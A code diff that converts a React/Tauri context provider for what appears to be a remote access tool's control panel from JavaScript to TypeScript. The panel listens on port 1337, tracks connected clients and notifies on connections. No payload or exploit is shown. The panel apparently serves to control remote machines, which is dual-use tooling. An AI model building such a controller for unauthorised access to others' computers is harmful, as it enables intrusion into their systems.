@@ -1,17 +1,17 @@
-import { useState, useEffect } from "react";
+import React, { useState, useEffect } from "react";
 import { RATContext } from "./RATContext";
 import { invoke } from "@tauri-apps/api/tauri";
 import { listen } from "@tauri-apps/api/event";
 import toast from "react-hot-toast";
+import { RATClient, RATProviderProps } from "../../types";
 
-export const RATProvider = ({ children }) => {
-  const [port, setPort] = useState("1337");
-  const [running, setRunning] = useState(false);
-  const [clientList, setClientList] = useState({});
-  const [notificationClient, setNotificationClient] = useState(true);
-  const [loaded, setLoaded] = useState(false);
+export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
+  const [port, setPort] = useState<string>("1337");
+  const [running, setRunning] = useState<boolean>(false);
+  const [clientList, setClientList] = useState<RATClient[]>([]);
+  const [notificationClient, setNotificationClient] = useState<boolean>(true);
 
-  const [selectedClient, setSelectedClient] = useState("");
+  const [selectedClient, setSelectedClient] = useState<string>("");
 
   async function fetchClients() {
     setClientList(await invoke("fetch_clients"));
@@ -27,7 +27,7 @@ export const RATProvider = ({ children }) => {
     return () => clearInterval(interval);
   }, [running]);
 
-  const customToast = (icon, toast_message, bg) => {
+  const customToast = (icon: string, toast_message: string, bg: string) => {
     console.log(toast_message);
     return toast(toast_message, {
       icon,
@@ -35,7 +35,7 @@ export const RATProvider = ({ children }) => {
     });
   };
 
-  async function waitNotification(type) {
+  async function waitNotification(type: string) {
     const _ = listen(type, (event) => {
       let icon = type == "client_connected" ? "🤙" : "👋";
       let message = type == "client_connected" ? "connected" : "disconnected";
